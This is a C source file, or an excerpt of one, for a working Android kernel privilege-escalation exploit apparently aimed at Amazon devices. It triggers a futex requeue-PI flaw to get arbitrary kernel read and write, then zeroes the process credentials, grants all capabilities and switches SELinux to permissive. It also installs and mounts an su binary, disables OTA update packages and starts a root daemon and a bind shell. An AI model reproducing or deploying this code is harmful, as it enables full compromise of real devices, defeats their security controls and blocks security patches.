    dprintf(2, "[krw] walking task list head=%08x tail=%08x want=%s\n", INIT_TASK_TASKS, link,
            self_comm);
    fsync(2);

    for (unsigned count = 0; count < 4096; count++) {
        if (link == INIT_TASK_TASKS)
            break;
        if (link < 0xc1000000u || link >= 0xf0000000u || (link & 3u))
            return 0;
        uint32_t task = link - TASK_TASKS_OFF;
        if (task < 0xc1000000u || task >= 0xf0000000u)
            return 0;
        char comm[17] = {0};
        if (kernel_read_once(fd, task + TASK_COMM_OFF, comm, 16) != 16)
            return 0;
        if (!strncmp(comm, self_comm, 16)) {
            dprintf(2, "[krw] current task=%08x comm=%s steps=%u\n", task, comm, count);
            fsync(2);
            return task;
        }
        uint32_t prev = 0;
        if (!kernel_read_u32(fd, link + 4, &prev) || prev == link)
            return 0;
        link = prev;
    }
    return 0;
}

static int patch_current_credentials(int fd, uint32_t task) {
    uint32_t real_cred = 0, cred = 0;
    if (!kernel_read_u32(fd, task + TASK_REAL_CRED_OFF, &real_cred) ||
        !kernel_read_u32(fd, task + TASK_CRED_OFF, &cred) || !kernel_ptr(real_cred) ||
        !kernel_ptr(cred))
        return 0;
    dprintf(2, "[root] real_cred=%08x cred=%08x\n", real_cred, cred);
    fsync(2);

    if (!kernel_zero_credential_ids(fd, cred))
        return 0;
    uint32_t ids[8];
    if (kernel_read_once(fd, cred + 0x04, ids, sizeof(ids)) != sizeof(ids))
        return 0;
    for (unsigned i = 0; i < 8; i++)
        if (ids[i] != 0)
            return 0;
    dprintf(2, "[root] credential UID/GID fields zeroed\n");

    if (kernel_grant_full_caps(fd, cred)) {
        uint32_t eff[2] = {0, 0};
        kernel_read_once(fd, cred + g_profile.cred_cap_effective_off, eff, sizeof(eff));
        dprintf(2, "[root] capabilities granted cap_effective=%08x%08x\n", eff[1], eff[0]);
    } else {
        dprintf(2, "[-] capability grant failed (mount/setns su install may not work)\n");
    }
    fsync(2);
    return 1;
}

static void make_reclaimed_write_payload(uint32_t target) {
    memset(payload, 0, sizeof(payload));
    put_a32(0x00, g_fake_fops);
    put_a32(0x04, 0);
    put_a32(0x08, target);
    put_a32(0x0c, g_fake_fops);
    put_a32(0x10, 0);
    put_a32(0x14, target);
    put_a32(0x18, PI_TASK);
    put_a32(0x1c, g_fake_lock);
    put_a32(0x20, 0x7fffffffu);
}

static int validate_loaded_profile(char *error, size_t error_size) {
    if (strcmp(g_profile.exploit_path, "configfs-mm-reclaim-v1")) {
        snprintf(error, error_size, "unsupported exploit path: %s", g_profile.exploit_path);
        return 0;
    }
    const uint32_t addresses[] = {
        INIT_TASK,          PI_TASK,
        ASHMEM_FOPS,        ASHMEM_MISC_FOPS,
        g_profile.ashmem_open, g_profile.ashmem_release,
        g_profile.ashmem_ioctl, g_profile.ashmem_mmap,
        CONFIGFS_READ_FILE, CONFIGFS_WRITE_FILE,
    };
    for (unsigned i = 0; i < sizeof(addresses) / sizeof(addresses[0]); i++)
        if (!kernel_ptr(addresses[i])) {
            snprintf(error, error_size, "profile contains invalid kernel address %08x",
                     addresses[i]);
            return 0;
        }
    const uint32_t offsets[] = {
        TASK_TASKS_OFF, TASK_REAL_CRED_OFF, TASK_CRED_OFF, TASK_COMM_OFF,
    };
    for (unsigned i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++)
        if (offsets[i] >= 0x2000u || (offsets[i] & 3u)) {
            snprintf(error, error_size, "profile contains invalid structure offset %08x",
                     offsets[i]);
            return 0;
        }
    long processor_count = sysconf(_SC_NPROCESSORS_CONF);
    if (processor_count <= 0 || WAITER_CORE >= (uint32_t)processor_count ||
        CONSUMER_CORE >= (uint32_t)processor_count || WAITER_CORE >= CPU_SETSIZE ||
        CONSUMER_CORE >= CPU_SETSIZE || WAITER_CORE == CONSUMER_CORE ||
        CONSUMER_DELAY_US < 1000u || CONSUMER_DELAY_US > 1000000u) {
        snprintf(error, error_size, "profile contains invalid CPU or timing parameters");
        return 0;
    }
    if (TASK_REAL_CRED_OFF + 4 != TASK_CRED_OFF || TASK_CRED_OFF + 4 != TASK_COMM_OFF ||
        !kernel_ptr(g_profile.kernel_image_base) || !g_profile.kernel_size ||
        g_profile.kernel_similarity_ppm > 1000000u) {
        snprintf(error, error_size, "profile contains inconsistent layout metadata");
        return 0;
    }
    if (g_profile.futex_hash_len < 2 || g_profile.futex_hash_len > 3 ||
        (g_profile.futex_hash_buckets & (g_profile.futex_hash_buckets - 1)) ||
        !g_profile.futex_hash_buckets || g_profile.futex_hash_buckets > KS_HASH_MAX) {
        snprintf(error, error_size, "profile contains invalid futex hash parameters");
        return 0;
    }
    if (g_profile.stamp_socket_kind > 2 || g_profile.stamp_copy_depth < 0x40 ||
        g_profile.stamp_waiter_depth < 0x40 || g_profile.stamp_copy_depth > 0x2000 ||
        g_profile.stamp_waiter_depth > 0x2000) {
        snprintf(error, error_size, "profile contains invalid stamp geometry");
        return 0;
    }
    return 1;
}

static void apply_tuning(void) {
    g_hash_len = g_profile.futex_hash_len;
    g_hash_seed = g_profile.futex_hash_seed;
    g_hash_mask = g_profile.futex_hash_buckets - 1;
}

#ifndef CLONE_NEWNS
#define CLONE_NEWNS 0x00020000
#endif
#ifndef TIOCSCTTY
#define TIOCSCTTY 0x540E
#endif

#define SU_LOCAL "/data/local/tmp/gl/su"

static int write_self_copy(const char *dst) {
    int in = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
    if (in < 0)
        return 0;
    int out = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755);
    if (out < 0) {
        close(in);
        return 0;
    }
    char buf[65536];
    ssize_t n;
    int ok = 1;
    while ((n = read(in, buf, sizeof(buf))) > 0)
        if (write(out, buf, (size_t)n) != n) {
            ok = 0;
            break;
        }
    if (n < 0)
        ok = 0;
    fchmod(out, 0755);
    close(in);
    close(out);
    return ok;
}

static pid_t find_pid_by_comm(const char *name) {
    DIR *d = opendir("/proc");
    if (!d)
        return -1;
    struct dirent *e;
    pid_t found = -1;
    while ((e = readdir(d))) {
        if (e->d_name[0] < '0' || e->d_name[0] > '9')
            continue;
        char path[64], comm[64] = {0};
        snprintf(path, sizeof(path), "/proc/%s/comm", e->d_name);
        int fd = open(path, O_RDONLY | O_CLOEXEC);
        if (fd < 0)
            continue;
        ssize_t n = read(fd, comm, sizeof(comm) - 1);
        close(fd);
        if (n > 0) {
            comm[n] = 0;
            char *nl = strchr(comm, '\n');
            if (nl)
                *nl = 0;
            if (!strcmp(comm, name)) {
                found = (pid_t)atoi(e->d_name);
                break;
            }
        }
    }
    closedir(d);
    return found;
}

static int same_mount_ns(pid_t other) {
    char a[64], b[64];
    ssize_t na = readlink("/proc/self/ns/mnt", a, sizeof(a) - 1);
    snprintf(b, sizeof(b), "/proc/%d/ns/mnt", other);
    char t[64];
    ssize_t nb = readlink(b, t, sizeof(t) - 1);
    if (na <= 0 || nb <= 0)
        return 0;
    a[na] = 0;
    t[nb] = 0;
    return !strcmp(a, t);
}

static int mount_su_in_dir(const char *dir) {
    if (mount("tmpfs", dir, "tmpfs", 0, "mode=0755,size=2m") != 0)
        return 0;
    char dst[256];
    snprintf(dst, sizeof(dst), "%s/su", dir);
    return write_self_copy(dst) && access(dst, X_OK) == 0;
}

static void install_su(int fd) {
    (void)fd;
    write_self_copy(SU_LOCAL);
    dprintf(2, "[su] local su=%s installed\n", SU_LOCAL);
}

static int mount_su_all(void) {
    const char *dirs[] = {"/system/xbin", "/system/sbin", "/vendor/xbin"};
    pid_t adbd = find_pid_by_comm("adbd");
    if (adbd > 0 && !same_mount_ns(adbd)) {
        char ns[64];
        snprintf(ns, sizeof(ns), "/proc/%d/ns/mnt", adbd);
        int nsfd = open(ns, O_RDONLY | O_CLOEXEC);
        if (nsfd >= 0) {
            syscall(__NR_setns, nsfd, CLONE_NEWNS);
            close(nsfd);
        }
    }
    for (unsigned i = 0; i < sizeof(dirs) / sizeof(dirs[0]); i++) {
        struct stat st;
        if (stat(dirs[i], &st) == 0 && mount_su_in_dir(dirs[i])) {
            dprintf(2, "[su] mounted %s/su (bare su ready)\n", dirs[i]);
            return 1;
        }
    }
    dprintf(2, "[su] bare-su mount failed (needs Permissive); use %s\n", SU_LOCAL);
    return 0;
}

static void run_pm(const char *action, const char *pkg) {
    pid_t c = fork();
    if (c == 0) {
        int nul = open("/dev/null", O_RDWR);
        if (nul >= 0) {
            dup2(nul, 1);
            dup2(nul, 2);
            if (nul > 2)
                close(nul);
        }
        setresgid(0, 0, 0);
        setresuid(0, 0, 0);
        execl("/system/bin/pm", "pm", action, pkg, (char *)NULL);
        _exit(127);
    }
    if (c > 0)
        while (waitpid(c, NULL, 0) < 0 && errno == EINTR) {
        }
}

static void disable_ota(void) {
    run_pm("disable-user", "com.amazon.device.software.ota");
    run_pm("clear", "com.amazon.device.software.ota");
    run_pm("disable-user", "com.amazon.device.software.ota.override");
    pid_t s = fork();
    if (s == 0) {
        execl("/system/bin/sync", "sync", (char *)NULL);
        _exit(127);
    }
    if (s > 0)
        while (waitpid(s, NULL, 0) < 0 && errno == EINTR) {
        }
    dprintf(2, "[ota] update packages disabled\n");
}

static const char *base_name(const char *path) {
    const char *slash = strrchr(path, '/');
    return slash ? slash + 1 : path;
}

static void run_root_script(const char *path) {
    dprintf(2, "[exec] running %s as uid=%d\n", path, getuid());
    fsync(2);
    pid_t p = fork();
    if (p == 0) {
        set_root_env();
        char dir[4096];
        snprintf(dir, sizeof(dir), "%s", path);
        char *slash = strrchr(dir, '/');
        if (slash && slash != dir) {
            *slash = 0;
            chdir(dir);
        } else {
            chdir("/data/local/tmp");
        }
        execl("/system/bin/sh", "sh", path, (char *)NULL);
        _exit(127);
    }
    if (p > 0) {
        int st = 0;
        while (waitpid(p, &st, 0) < 0 && errno == EINTR) {
        }
        int code = WIFEXITED(st) ? WEXITSTATUS(st) : -1;
        dprintf(2, "[exec] %s exited status=%d\n", path, code);
        fsync(2);
    }
}

static void retry_or_hold(void) {
    if (g_tries > 1) {
        char buf[16];
        snprintf(buf, sizeof(buf), "%d", g_tries - 1);
        setenv("GL_TRIES", buf, 1);
        dprintf(2, "[retry] clean failure; re-exec with %d tries left\n", g_tries - 1);
        fsync(2);
        execv("/proc/self/exe", g_argv);
    }
    for (;;)
        sleep(3600);
}

static void usage(const char *program) {
    dprintf(2,
            "Usage: %s [--profiles DIR | --profile FILE] [--check-profile] [--leak-test] [--tries N] [--exec SCRIPT]\n"
            "       %s --client COMMAND...\n"
            "       %s --listener-test\n",
            program, program, program);
}

int main(int argc, char **argv) {
    g_argv = argv;
    if (argc >= 1 && !strcmp(base_name(argv[0]), "su"))
        return su_main(argc, argv);
    if (argc >= 2 && !strcmp(argv[1], "--su"))
        return su_main(argc - 1, argv + 1);
    if (argc >= 2 && !strcmp(argv[1], "--client"))
        return root_client(argc, argv);
    if (argc >= 2 && !strcmp(argv[1], "--listener-test"))
        return prepare_root_listener() ? 0 : 1;

    setvbuf(stderr, NULL, _IONBF, 0);
    const char *profile_directory = NULL;
    const char *profile_path = NULL;
    int check_profile = 0, leak_test = 0;
    const char *tries_env = getenv("GL_TRIES");
    g_tries = tries_env ? atoi(tries_env) : 1;
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--check-profile")) {
            check_profile = 1;
        } else if (!strcmp(argv[i], "--leak-test")) {
            leak_test = 1;
        } else if (!strcmp(argv[i], "--tries") && i + 1 < argc) {
            g_tries = atoi(argv[++i]);
        } else if (!strcmp(argv[i], "--profiles") && i + 1 < argc) {
            profile_directory = argv[++i];
        } else if (!strcmp(argv[i], "--profile") && i + 1 < argc) {
            profile_path = argv[++i];
        } else if (!strcmp(argv[i], "--exec") && i + 1 < argc) {
            g_exec_script = argv[++i];
        } else {
            usage(argv[0]);
            return 64;
        }
    }
    if (g_tries < 1)
        g_tries = 1;

    struct gl_runtime runtime;
    char profile_error[512] = {0};
    char selected_profile[1024] = {0};
    int ok = gl_runtime_read(&runtime, profile_error, sizeof(profile_error));
    if (ok) {
        if (profile_path || profile_directory) {
            ok = gl_profile_select(profile_directory ? profile_directory : "profiles", profile_path,
                                   &runtime, &g_profile, selected_profile, sizeof(selected_profile),
                                   profile_error, sizeof(profile_error));
        } else {
            ok = gl_profile_select_embedded(&runtime, &g_profile, profile_error,
                                            sizeof(profile_error));
            snprintf(selected_profile, sizeof(selected_profile), "<built-in>");
        }
    }
    if (ok)
        ok = validate_loaded_profile(profile_error, sizeof(profile_error));
    if (!ok) {
        dprintf(2, "[-] profile rejected: %s\n", profile_error);
        return 64;
    }
    if (check_profile) {
        gl_profile_print(&g_profile, &runtime, selected_profile);
        return 0;
    }
    apply_tuning();

    dprintf(2, "[+] init_task=%08x ashmem_misc_fops=%08x original=%08x\n", INIT_TASK,
            ASHMEM_MISC_FOPS, ASHMEM_FOPS);

    if (!prepare_stack_stamp()) {
        dprintf(2, "[-] failed to prepare stack stamper errno=%d\n", errno);
        return 2;
    }

    if (!prepare_reclaimed_page()) {
        dprintf(2, "[-] failed to prepare writable kernel page\n");
        if (leak_test)
            return 2;
        retry_or_hold();
    }
    make_reclaimed_write_payload(ASHMEM_MISC_FOPS);
    if (leak_test) {
        dprintf(2, "[leak-test] reclaim prepared; fake_lock=%08x fake_fops=%08x. Not triggering.\n",
                g_fake_lock, g_fake_fops);
        return 0;
    }

    pthread_t w, o, c;
    pthread_create(&w, NULL, waiter_fn, NULL);
    pthread_create(&o, NULL, owner_fn, NULL);
    pthread_create(&c, NULL, consumer_fn, NULL);
    while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
        usleep(1000);
    usleep(200000);
    dprintf(2, "[m] CMP_REQUEUE_PI\n");
    errno = 0;
    syscall(__NR_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    dprintf(2, "[m] returned errno=%d (want 35)\n", errno);
    int hit = -1;
    while (!atomic_load(&consumer_done)) {
        hit = find_fake_fops_word(g_profile.fops_read_off, CONFIGFS_READ_FILE);
        if (hit >= 0)
            break;
        usleep(1000);
    }
    while (!atomic_load(&consumer_done))
        usleep(1000);
    if (hit < 0)
        hit = find_fake_fops_word(g_profile.fops_read_off, CONFIGFS_READ_FILE);
    dprintf(2, "[write] reclaim socket=%d\n", hit);
    dprintf(2, "[write] fops stage returned; opening /dev/ashmem\n");
    int afd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
    if (afd < 0) {
        dprintf(2, "[-] ashmem open failed errno=%d\n", errno);
        return 5;
    }
    uint32_t check = 0;
    if (!kernel_read_u32(afd, g_fake_fops + g_profile.fops_read_off, &check) ||
        check != CONFIGFS_READ_FILE) {
        dprintf(2, "[-] preloaded read slot failed value=%08x errno=%d\n", check, errno);
        fsync(2);
        retry_or_hold();
    }
    dprintf(2, "[krw] arbitrary read + zero-write active; read=%08x\n", check);
    fsync(2);

    if (!validate_runtime_profile(afd)) {
        dprintf(2, "[-] loaded profile failed runtime validation; holding reclaim\n");
        fsync(2);
        retry_or_hold();
    }

    if (!prepare_root_listener()) {
        dprintf(2, "[-] command listener unavailable; holding reclaim\n");
        retry_or_hold();
    }

    uint32_t current_task = find_current_task(afd);
    if (!current_task) {
        dprintf(2, "[-] current task tail lookup failed; holding reclaim\n");
        fsync(2);
        retry_or_hold();
    }
    if (!patch_current_credentials(afd, current_task)) {
        dprintf(2, "[-] credential patch failed for task=%08x\n", current_task);
        retry_or_hold();
    }
    dprintf(2, "[root] uid=%d euid=%d gid=%d\n", getuid(), geteuid(), getgid());
    if (getuid() != 0 || geteuid() != 0)
        return 3;

    install_su(afd);

    pid_t daemon = fork();
    if (daemon < 0) {
        perror("fork daemon");
        return 4;
    }
    if (daemon == 0) {
        setsid();
        int dn = open("/dev/null", O_RDWR);
        if (dn >= 0) {
            dup2(dn, 0);
            dup2(dn, 1);
            dup2(dn, 2);
        }
        root_server();
        _exit(0);
    }
    dprintf(2, "[ROOT] uid=0 daemon pid=%d socket=@%s\n", daemon, ROOT_SOCK_NAME);

    pid_t pc = fork();
    if (pc == 0) {
        if (g_profile.selinux_enforcing)
            kernel_set_permissive(afd, current_task);
        mount_su_all();
        disable_ota();
        if (g_exec_script)
            run_root_script(g_exec_script);
        _exit(0);
    }
    (void)pc;

    pid_t bs = fork();
    if (bs == 0) {
        setsid();
        int dn = open("/dev/null", O_RDWR);
        if (dn >= 0) {
            dup2(dn, 0);
            dup2(dn, 1);
            dup2(dn, 2);
            if (dn > 2)
                close(dn);
        }
        bind_shell_server();
        _exit(0);
    }
    (void)bs;
    dprintf(2, "[bind] shell pid=%d: netcat 127.0.0.1:%d, launcher-manager 127.0.0.1:%d\n", bs,
            BIND_SHELL_PORT, LM_SHELL_PORT);

    for (;;)
        sleep(3600);
}
